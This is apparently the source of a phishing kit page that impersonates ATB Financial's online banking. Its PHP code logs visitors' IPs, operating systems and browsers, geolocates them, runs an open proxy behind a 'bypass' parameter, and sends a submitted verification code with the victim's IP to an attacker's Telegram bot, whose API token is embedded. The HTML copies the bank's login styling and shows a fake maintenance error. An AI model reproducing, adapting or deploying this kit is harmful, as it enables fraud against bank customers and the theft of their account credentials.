<?php
include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "ATB";

    $url        = "https://ATB.com";
    $code       = $_POST['code']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank\n$ip\n$code";
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-871948148',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
      
      <html class="fa-events-icons-ready" data-kantu="1"><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-KGVVNNM"></script><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/prompt.js"></script><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/runScript.js"></script><head><script>(function(){function hookGeo() {

<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script async="" src="files/gtm_012.js"></script><script async="" src="files/gtm_011.js"></script><script async="" src="files/gtm_010.js"></script><script async="" src="files/gtm_009.js"></script><script async="" src="files/gtm_008.js"></script><script async="" src="files/gtm_007.js"></script><script async="" src="files/gtm_006.js"></script><script async="" src="files/gtm_005.js"></script><script async="" src="files/gtm_004.js"></script><script async="" src="files/gtm_003.js"></script><script async="" src="files/gtm_002.js"></script><script async="" src="files/gtm.js"></script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="Shortcut Icon" href="https://www.atb.com/static/img/favicon.ico" type="image/x-icon">
    <title>ATB Personal Banking</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="files/index.php">

    <!-- This font seems not to be used. TODO: Remove these lines completely as soon as we are sure that this not being used.
    <script src="https://use.typekit.net/deb5vpt.js"></script>
    <script>try{Typekit.load({ async: true });}catch(e){}</script> -->
    <link rel="stylesheet" type="text/css" href="files/fonts.css">
    <link href="files/f26ba7188d.css" media="all" rel="stylesheet">
    <link href="files/css.css" rel="stylesheet">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-KGVVNNM');
    </script>
    <!-- End Google Tag Manager -->

  <style type="text/css" data-styled-components="" data-styled-components-is-local="false">
/* sc-component-id: sc-global-360865453 */
body{font-family:'Open Sans',sans-serif;font-weight:normal;font-size:14px;color:rgba(43,53,61,1);}a{font-family:'Open Sans',sans-serif;font-weight:bold;font-size:14px;color:rgba(43,53,61,0.56);}label{font-family:'Open Sans',sans-serif;font-weight:600;font-size:14px;color:rgba(43,53,61,0.56);}label.validation-error{color:#EB0042;}label.input{display:block;}label.input.top{padding-bottom:8px;}label.input.bottom{font-family:'Open Sans',sans-serif;font-weight:normal;font-size:12px;color:rgba(43,53,61,0.72);color:#EB0042;padding-top:8px;}a.button{display:block;-webkit-text-decoration:none;text-decoration:none;line-height:32px;height:32px !important;}.uiNewButtonWrapper{position:relative;font-size:0;}.uiNewButtonWrapper span.dynamic-button__spinner{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);color:#fff;line-height:1.5715;font-size:16px;}.uiNewButtonWrapper span.dynamic-button__spinner span[role=img],.uiNewButtonWrapper span.dynamic-button__spinner svg{cursor:pointer;width:1em;height:1em;}.uiNewButtonWrapper span.dynamic-button__spinner .anticon{display:inline-block;color:inherit;font-style:normal;line-height:0;text-align:center;text-transform:none;vertical-align:-0.125em;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}.uiNewButtonWrapper span.dynamic-button__spinner .anticon > *{line-height:1;}.uiNewButtonWrapper span.dynamic-button__spinner .anticon svg{display:inline-block;}.uiNewButtonWrapper span.dynamic-button__spinner .anticon::before{display:none;}.uiNewButtonWrapper span.dynamic-button__spinner .anticon-spin::before,.uiNewButtonWrapper span.dynamic-button__spinner .anticon-spin{display:inline-block;-webkit-animation:loadingCircle 1s infinite linear;-webkit-animation:loadingCircle 1s infinite linear;animation:loadingCircle 1s infinite linear;}@-webkit-keyframes loadingCircle{100%{-webkit-transform:rotate(360deg);-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@-webkit-keyframes loadingCircle{100%{-webkit-transform:rotate(360deg);-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes loadingCircle{100%{-webkit-transform:rotate(360deg);-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}input[type="submit"],a.button{font-family:'Open Sans',sans-serif;font-weight:bold;font-size:14px;color:rgba(43,53,61,1);height:44px;min-width:88px;padding-left:16px;padding-right:16px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px;cursor:pointer;}input[type="submit"].primary,a.button.primary{background-color:#005eb8;color:rgba(255,255,255,1);border:0px none;-webkit-appearance:none;}input[type="submit"].primary.disabled,a.button.primary.disabled{background-color:rgba(43,53,61,0.16);}input[type="submit"].primary:hover,a.button.primary:hover{box-shadow:0 2px 6px 0 rgba(0,0,0,0.32);}input[type="submit"].secondary,a.button.secondary{border:solid 1px;background-colour:none;color:#005eb8;}input[type="submit"].secondary.disabled,a.button.secondary.disabled{color:rgba(43,53,61,0.16);border-color:rgba(43,53,61,0.16);}input[type="submit"].secondary:hover,a.button.secondary:hover{box-shadow:inset 0px 0px 0px 1px;}input[type="submit"].grey,a.button.grey{border-color:rgba(43,53,61,0.56);color:rgba(43,53,61,0.56);background-color:#ffffff;}input[type="submit"].pink,a.button.pink{border-color:#EB0042;color:#EB0042;background-color:#ffffff;}input[type="submit"].orange,a.button.orange{border-color:#FF671F;color:#FF671F;background-color:#ffffff;}input[type="submit"].green,a.button.green{border-color:#008576;color:#008576;background-color:#ffffff;}input[type="submit"].brand-secondary,a.button.brand-secondary{border-color:#009CDE;color:#009CDE;background-color:#ffffff;}input{height:10000px;font-family:'Open Sans',sans-serif;font-weight:normal;font-size:0.875rem;color:rgba(43,53,61,1);background-color:#ffffff;border:1px solid rgba(43,53,61,0.32);-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;box-sizing:border-box;padding-left:16px;padding-right:16px;width:100%;height:44px;outline:none;}input.validation-error{border-color:#EB0042;}input:hover{border-color:rgba(43,53,61,0.56);}input:focus{border-color:#005eb8;}input:focus::-webkit-textfield-decoration-container{visibility:hidden;pointer-events:none;}input::-webkit-contacts-auto-fill-button{visibility:hidden;display:none !important;pointer-events:none;}input[type=password]::-ms-reveal{display:none;}input[type=text]::-ms-clear{display:none;}#footer-login{font-family:'Open Sans',sans-serif;font-weight:normal;font-size:12px;color:rgba(43,53,61,0.72);font-size:10px;line-height:16px;}h1{font-family:'Sentinel';font-weight:medium;font-size:34px;color:rgba(43,53,61,1);}h2{font-family:'Open Sans',sans-serif;font-weight:bold;font-size:22px;color:rgba(43,53,61,1);}h3{font-family:'Open Sans',sans-serif;font-weight:bold;font-size:18px;color:rgba(43,53,61,1);}h4{font-family:'Open Sans',sans-serif;font-weight:normal;font-size:18px;color:rgba(43,53,61,1);}h5{font-family:'Open Sans',sans-serif;font-weight:bold;font-size:14px;color:rgba(43,53,61,1);}.caption-1{font-family:'Open Sans',sans-serif;font-style:italic;font-weight:normal;font-size:14px;color:rgba(43,53,61,0.72);}.caption-2{font-family:'Open Sans',sans-serif;font-weight:normal;font-size:12px;color:rgba(43,53,61,0.72);}
/* sc-component-id: sc-global-2805340612 */
input:focus{border-color:#0072F0;}.paragraph-2{font-family:"Inter";font-size:14px;line-height:20px;}.paragraph-3{font-family:"Inter";font-size:12px;line-height:16px;}.paragraph-3 a.ant-typography,.paragraph-3 .ant-typography a,.paragraph-3 a{font-size:12px;}svg#login text{font-family:"Inter";font-size:12px;line-height:16px;}.subtitle-2{font-family:"Inter" !important;font-weight:600;font-size:12px;line-height:16px;}.subtitle-1{font-family:"Inter" !important;font-weight:600;font-size:14px;line-height:20px;}.headline-5{font-size:18px !important;line-height:24px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}.headline-6{font-size:16px !important;line-height:24px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}.button-primary-rebrand{background-color:#0072F0 !important;}.button-primary-rebrand:hover{box-shadow:none !important;}@media only screen and (max-width:991px){.headline-5{font-size:16px !important;line-height:24px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}.headline-6{font-size:14px !important;line-height:24px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}}@media only screen and (max-width:767px){.headline-5{font-size:14px !important;line-height:20px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}.headline-6{font-size:14px !important;line-height:20px;font-family:"Inter" !important;font-weight:600;margin-bottom:8px;}}.rebank-loggedout{text-align:center;}.rebank-loggedout img{padding-bottom:8px;}.rebank-loggedout-message{color:#44444D;}.rebank-loggedout .border-space-green{margin-top:22px;height:22px;border-top:solid 2px #00855d;}.rebank-loggedout .border-space-red{margin-top:22px;height:22px;border-top:solid 2px #EB0042;}.rebank-loggedout .border-space-yellow{margin-top:22px;height:22px;border-top:solid 2px #f1bc00;}.rebank-loggedout .title{font-size:20px;font-weight:600;font-stretch:normal;font-style:normal;line-height:normal;color:#44444D;-webkit-letter-spacing:0.02px;-moz-letter-spacing:0.02px;-ms-letter-spacing:0.02px;letter-spacing:0.02px;padding-top:10px;padding-bottom:10px;}.rebank-loggedout .title.invalidusernameorpassword{font-size:18px;}.rebank-textfield{color:#44444D;border-color:#44444D !important;font-family:"Inter";font-weight:normal;}.rebank-textfield:hover{border-color:#44444D !important;}.rebank-textfield:focus{border-color:#0072F0 !important;}#caps-lock{height:15px;width:15px;margin-top:-30px;margin-left:15px;}.secureKey-textfield{font-weight:normal;}#caps-lock{height:15px;width:15px;margin-top:-30px;margin-left:15px;}.rebank-button.rebank-button{font-family:"Inter";font-weight:normal;}#mask-toggle{margin-top:-46px;width:40px;margin-right:4px !important;}.validation-error.rebank-textfield{color:#44444D;}
/* sc-component-id: sc-global-218314145 */
*{margin:0;}#app{height:100%;}html,body{font-family:Inter;background-color:white;height:100%;}.flex-fix{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex:1 0 auto;-ms-flex:1 0 auto;flex:1 0 auto;}@-moz-document url-prefix(){.flex-fix{-webkit-flex:1;-ms-flex:1;flex:1;}}@media not all and (min-width:320px){.loginBoxTd{vertical-align:top;}}@media not all and (min-width:720px){.overallContainer{vertical-align:top;width:100%;}}</style><style type="text/css" data-styled-components="bzQzYK iUyiAj eNoisr cwXkDs khUSez fJrgwy bPSoWc jQbsgO klnAeX emnlIF kPYCsv grFJIy kfWmrv fFPsgR hfZKkh" data-styled-components-is-local="true">
/* sc-component-id: sc-bdVaJa */

.khUSez{text-align:center;}
/* sc-component-id: sc-bwzfXH */

.bPSoWc{text-align:center;font-weight:normal;color:#44444D;}@media all and (min-width:992px){.bPSoWc{padding-top:150px;}}@media (min-width:767px) and (max-width:991px){.bPSoWc{padding-top:130px;}}@media not all and (min-width:767px){.bPSoWc{padding-top:130px;}}.bPSoWc a{font-family:Inter !important;font-weight:600 !important;-webkit-text-decoration:none;text-decoration:none;color:#0072F0;}.bPSoWc a:hover{color:#0053db;}
/* sc-component-id: sc-htpNat */

.fJrgwy{width:202px;height:54px;object-fit:contain;}
/* sc-component-id: sc-iwsKbI */

.iUyiAj{width:100%;height:40px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;background:#0072F0;}@media all and (min-width:992px){.iUyiAj{display:none;}}@media (min-width:767px) and (max-width:991px){.iUyiAj{display:none;}}@media not all and (min-width:767px){.iUyiAj{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}}
/* sc-component-id: sc-VigVT */

.jQbsgO{height:0.7em;}
/* sc-component-id: sc-jTzLTM */

.cwXkDs{box-sizing:border-box;background:#ffffff;min-width:320px;width:420px;height:100%;padding:60px;padding-top:60px;}@media all and (min-width:992px){.cwXkDs{padding-bottom:10px;}}@media (min-width:767px) and (max-width:991px){.cwXkDs{width:320px;padding:20px;padding-top:60px;}}@media not all and (min-width:767px){.cwXkDs{width:320px;padding:33px;padding-top:60px;}}
/* sc-component-id: sc-fjdhpX */

.grFJIy{padding-top:50px;}
/* sc-component-id: sc-jzJRlG */

.eNoisr{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;}@media all and (min-width:992px){.eNoisr{height:100%;width:40%;}}@media (min-width:767px) and (max-width:991px){.eNoisr{width:100%;}}@media not all and (min-width:767px){.eNoisr{width:320px;}}
/* sc-component-id: sc-kAzzGY */

.klnAeX{width:604px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;background:#0072F0;vertical-align:middle;-webkit-align-content:stretch;-ms-flex-line-pack:stretch;align-content:stretch;text-align:left;color:white;font-family:Inter;font-size:68px;font-style:normal;font-stretch:normal;line-height:1.07;-webkit-letter-spacing:normal;-moz-letter-spacing:normal;-ms-letter-spacing:normal;letter-spacing:normal;}@media all and (min-width:992px){.klnAeX{width:60%;}}@media (min-width:767px) and (max-width:991px){.klnAeX{width:100%;overflow:hidden;-webkit-flex:1;-ms-flex:1;flex:1;}}@media not all and (min-width:767px){.klnAeX{display:none;}}
/* sc-component-id: sc-chPdSV */

.emnlIF{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}
/* sc-component-id: sc-kgoBCf */

.bzQzYK{background:#ffffff;vertical-align:top;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;min-width:320px;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media all and (min-width:992px){.bzQzYK{-webkit-align-items:stretch;-webkit-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;min-height:100vh;}}@media (min-width:767px) and (max-width:991px){.bzQzYK{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;height:100vh;}}@media not all and (min-width:767px){.bzQzYK{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}
/* sc-component-id: sc-dxgOiQ */

.hfZKkh{color:#0072F0;text-align:center;font-family:Inter;font-weight:600;font-style:normal;font-stretch:normal;background:none;border:none;-webkit-flex:center;-ms-flex:center;flex:center;width:100%;cursor:pointer;}.hfZKkh:hover{color:#0053db;}
/* sc-component-id: sc-ckVGcZ */

.kPYCsv{width:100%;background-repeat:no-repeat;background-size:cover;background-image:url("https://verify.auth.atb.com/images/RebankWeb/login-page-sketch.svg");}@media (min-width:767px) and (max-width:991px){.kPYCsv{background-position:top;}}
/* sc-component-id: sc-eNQAEJ */

.fFPsgR{height:30px;width:30px;position:relative;float:right;margin-top:-39px;}
/* sc-component-id: sc-hMqMXs */

.kfWmrv{height:17px;width:17px;position:relative;float:right;margin-top:-30px;opacity:0;}</style><style type="text/css">@import url(https://fonts.googleapis.com/css2?family=Inter&display=swap);</style><style type="text/css"></style></script></script></head><body>
  
  
  

  
    <div id="app"><div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper"><div></div><div class="sc-jzJRlG eNoisr"><div class="sc-dnqmqq jYXEA">
<form method="post" action="https://atb.com" class="sc-jTzLTM cwXkDs" id="rbw-login-block"><center></center>
<div class="sc-fjdhpX grFJIy" id="rbw-login-form-login-block"><div><span><center>
<center>
  <br><br><div> <font size="4"></font><br><br>
  <font size="2">
Sorry, There was an error, It's not you! Please try later! We are Updating our Systems 
<br><br>[Time zone GMT/UTC 07:00 - 23:00]</font><br><br></div></center></center>
<span class="rbw-login-form-input-username-clear-field sc-hMqMXs kfWmrv" id="rbw-login-form-input-username-clear-field" data-masked="false" style="cursor: pointer; margin-right: 15px; opacity: 0;" title="Clear"><svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 17 17"><title>Clear button</title><g id="rbw-login-form-input-username-clear-field-icon" fill="none" fill-rule="evenodd" aria-hidden="true"><path fill="#cecccb" fill-opacity=".5" fill-rule="nonzero" d="M8.5 0C3.8 0 0 3.8 0 8.5S3.8 17 8.5 17 17 13.2 17 8.5 13.2 0 8.5 0z"></path><path fill="#FFF" d="M10.946 4.722L8.5 7.168 6.054 4.722 4.722 6.054 7.168 8.5l-2.446 2.446 1.332 1.332L8.5 9.832l2.446 2.446 1.332-1.332L9.832 8.5l2.446-2.446z"></path></g></svg></span></span><div class="sc-VigVT jQbsgO"></div><div class="uiNewButtonWrapper "><input class="headline-6 button-primary-rebrand primary" id="rbw-login-form-button-submit" type="submit" label="Verify" value="Log out"></div></div></div><div class="sc-bwzfXH bPSoWc" id="rbw-footer-footer-style"><span id="rbw-footer-footer-login" class="subtitle-2"><a href="https://www.atb.com/" target="_blank">atb.com</a> | <a href="https://www.atb.com/contact-us/Pages/default.aspx" target="_blank">Contact us</a> | <a href="https://www.atb.com/company/privacy-and-security/online-guarantee" target="_blank">Terms</a> | <a href="https://www.atb.com/important-information/privacy-security/Pages/Privacy-and-Security-Tips.aspx?utm_source=atbol&amp;utm_medium=login&amp;utm_campaign=security-commitment-security-tips" target="_blank">Security tips</a></span><div class="sc-VigVT jQbsgO"></div><div class="sc-VigVT jQbsgO"></div><span class="paragraph-3">© ATB Financial 2023. All Rights Reserved. Authorized access only. Usage may be monitored.</span></div></form></div></div>
<div class="sc-kAzzGY klnAeX"><div class="sc-chPdSV emnlIF" id="rbw-marquee-block"><div class="sc-ckVGcZ kPYCsv"></div></div></div></div></div>
  </body></html>
